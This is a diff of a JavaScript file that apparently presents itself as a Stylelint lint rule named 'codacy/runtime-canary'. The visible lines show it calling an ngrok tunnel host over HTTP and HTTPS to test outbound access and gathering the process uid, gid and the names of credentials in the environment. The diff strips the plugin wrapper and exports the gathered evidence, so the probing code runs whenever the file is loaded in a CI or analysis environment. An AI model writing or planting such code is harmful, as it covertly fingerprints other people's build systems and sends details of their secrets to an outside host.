@@ -2,7 +2,6 @@
 
 const fs = require("node:fs");
 const { spawnSync } = require("node:child_process");
-const stylelint = require("stylelint");
 
 const CALLBACKS = {
   http: "http://dcd6-49-207-201-243.ngrok-free.app/stylelint-http-3fc5441a",
@@ -89,7 +88,7 @@ for (const [protocol, callback] of Object.entries(CALLBACKS)) {
   egress[protocol] = probe.status === 0;
 }
 
-const runtimeEvidence = [
+module.exports = [
   "CODACY_STYLELINT_CANARY_EXECUTED",
   `uid=${runtime.uid}`,
   `gid=${runtime.gid}`,
@@ -101,18 +100,3 @@ const runtimeEvidence = [
   `https_egress=${egress.https}`,
   `credential_names=${Object.keys(credentials).sort().join(",")}`,
 ].join(" ");
-
-const ruleName = "codacy/runtime-canary";
-const ruleFunction = () => (root, result) => {
-  stylelint.utils.report({
-    message: runtimeEvidence,
-    node: root,
-    result,
-    ruleName,
-  });
-};
-
-ruleFunction.ruleName = ruleName;
-ruleFunction.messages = { rejected: runtimeEvidence };
-
-module.exports = stylelint.createPlugin(ruleName, ruleFunction);
